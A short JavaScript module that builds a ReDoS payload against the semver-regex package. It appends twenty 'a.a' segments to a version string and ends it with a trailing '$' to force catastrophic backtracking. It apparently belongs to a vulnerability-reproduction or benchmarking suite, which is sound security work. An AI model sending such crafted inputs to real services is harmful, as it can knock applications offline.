function getPayload() {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const semverRegex = require("semver-regex");

  let version = "v1.1.3-0a";
  for (let i = 0; i < 20; i++) {
    version += "a.a";
  }
  let attack_str = version + "aaaaaaa$";

  return { attack_str };
}

module.exports = { getPayload };